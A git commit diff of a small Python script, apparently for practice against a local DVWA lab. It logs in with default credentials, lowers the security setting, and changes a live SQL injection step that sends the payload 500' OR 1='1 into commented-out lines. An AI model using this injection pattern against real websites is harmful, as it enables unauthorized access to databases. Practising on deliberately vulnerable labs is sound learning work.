c6541ec745e72f608ed28d41c728b7e37334110f
Mihir Shah <41803909+mihir-ms@users.noreply.github.com>
2019-08-24 21:21:15 +0530

    Final

--- sqlmap.py
+++ sqlmap.py
@@ -1,10 +1,7 @@
 import mechanize
 import re
-import requests
-
 br=mechanize.Browser()
 br.set_handle_robots(False)
-#Login code
 br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
 print(br)
 br.select_form(nr=0)
@@ -12,36 +9,21 @@ br["username"]='admin'
 br["password"]='password'
 sub=br.submit()
 print(sub.geturl())
-#Security low code
 br.open("http://localhost/DVWA-master/security.php")
 br.select_form(nr=0)
 br["security"] = ["low"]
 sub = br.submit()
-#print(sub.read())
+print(sub.read())
 print(sub.geturl())
-#Cookies
-cookies = br._ua_handlers['_cookies'].cookiejar
-# convert cookies into a dict usable by requests
-cookie_dict = {}
-for c in cookies:
-    if c.name == 'security':
-        c.value = 'low'
-    else:
-        cookie_dict[c.name] = c.value
-# make a request
-print(cookie_dict)
-
-#print(r)
-#sql injection code
-br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
-br.select_form(nr=0)
-br["id"]="500' OR 1='1"
-sub=br.submit()
-print(sub.geturl())
-content = sub.read().decode("utf-8")
+#br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
+#br.select_form(nr=0)
+#br["id"]="500' OR 1='1"
+#sub=br.submit()
+#print(sub.geturl())
+#content = sub.read().decode("utf-8")
 #print(content)
-beg = [m.start() for m in re.finditer('<pre>',content)]
-end = [m.start() for m in re.finditer('</pre>',content)]
-print(beg,end)
-for i in range(len(beg)):
-    print(content[beg[i]:end[i]])
+#beg = content.find(b'<pre>')
+#end = content.find(b'</pre>')
+#print(beg,end)
+#print(content[beg:end])
+#print(re.match("First Name",content))
